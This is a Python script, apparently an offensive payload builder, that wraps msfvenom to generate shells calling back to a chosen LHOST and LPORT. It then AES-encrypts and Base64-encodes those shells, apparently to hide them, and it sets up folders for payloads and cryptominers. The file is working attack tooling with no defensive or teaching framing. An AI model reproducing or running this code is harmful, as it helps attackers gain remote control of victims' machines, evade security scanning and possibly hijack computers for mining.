import os
import shutil
import subprocess
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from cryptography.fernet import Fernet

SHELLS_DIR = "generated_shells"
PAYLOADS_DIR = "payloads"
CRYPTOMINERS_DIR = os.path.join(PAYLOADS_DIR, "cryptominers")

if not os.path.exists(SHELLS_DIR):
    os.makedirs(SHELLS_DIR)
    print(f"[INFO] Created directory for shells: {SHELLS_DIR}")

if not os.path.exists(PAYLOADS_DIR):
    os.makedirs(PAYLOADS_DIR)
    print(f"[INFO] Created directory for payloads: {PAYLOADS_DIR}")

if not os.path.exists(CRYPTOMINERS_DIR):
    os.makedirs(CRYPTOMINERS_DIR)
    print(f"[INFO] Created directory for cryptominers: {CRYPTOMINERS_DIR}")

# Function: Generate Shell
def generate_msfvenom_shell(payload, lhost, lport, output_format, output_name):
    output_path = os.path.join(SHELLS_DIR, output_name)
    try:
        print(f"[INFO] Generating shell with payload: {payload}")
        command = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", output_format,
            "-o", output_path,
        ]
        subprocess.run(command, check=True)
        print(f"[SUCCESS] Shell generated: {output_path}")
        return output_path
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to generate shell: {e}")
        return None

# AES Encryption Functions
def aes_encrypt(data, key):
    try:
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        return iv + encrypted_data
    except Exception as e:
        print(f"[ERROR] AES encryption failed: {e}")
        return None

def aes_decrypt(encrypted_data, key):
    try:
        iv = encrypted_data[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data[16:]), AES.block_size)
        return decrypted_data
    except Exception as e:
        print(f"[ERROR] AES decryption failed: {e}")
        return None

# Base64 Encoding Functions
def base64_encode(data):
    try:
        encoded = base64.b64encode(data)
        print("[INFO] Data successfully encoded in Base64.")
        return encoded
    except Exception as e:
        print(f"[ERROR] Base64 encoding failed: {e}")
        return None

def base64_decode(encoded_data):
    try:
        decoded = base64.b64decode(encoded_data)
        print("[INFO] Data successfully decoded from Base64.")
        return decoded
    except Exception as e:
        print(f"[ERROR] Base64 decoding failed: {e}")
        return None

# Function: Encrypt Shell (AES + Base64)
def encrypt_shell(shell_path, encryption_key):
    if not os.path.exists(shell_path):
        print(f"[ERROR] Shell file not found: {shell_path}")
        return None

    encrypted_path = f"{shell_path}.enc"
    try:
        with open(shell_path, "rb") as shell_file:
            shell_data = shell_file.read()

        aes_encrypted = aes_encrypt(shell_data, encryption_key)
        if aes_encrypted is None:
            return None

        base64_encrypted = base64_encode(aes_encrypted)
        if base64_encrypted is None:
            return None

        with open(encrypted_path, "wb") as encrypted_file:
            encrypted_file.write(base64_encrypted)

        print(f"[SUCCESS] Encrypted shell saved to: {encrypted_path}")
        return encrypted_path
    except Exception as e:
        print(f"[ERROR] Failed to encrypt shell: {e}")
        return None

# Function: Decrypt Shell (Base64 + AES)
def decrypt_shell(encrypted_path, encryption_key):
    if not os.path.exists(encrypted_path):
        print(f"[ERROR] Encrypted shell file not found: {encrypted_path}")
        return None

    decrypted_path = encrypted_path.replace(".enc", "_decrypted")
    try:
        with open(encrypted_path, "rb") as encrypted_file:
            encrypted_data = encrypted_file.read()

        base64_decoded = base64_decode(encrypted_data)
        if base64_decoded is None:
            return None

        aes_decrypted = aes_decrypt(base64_decoded, encryption_key)
        if aes_decrypted is None:
            return None

        with open(decrypted_path, "wb") as decrypted_file:
            decrypted_file.write(aes_decrypted)

        print(f"[SUCCESS] Decrypted shell saved to: {decrypted_path}")
        return decrypted_path
    except Exception as e:
        print(f"[ERROR] Failed to decrypt shell: {e}")
        return None

# Example: Generate Encryption Key
def generate_aes_key():
    key = os.urandom(16)  # 16 bytes for AES-128
    print(f"[INFO] AES key generated: {base64.b64encode(key).decode()}")
    return key
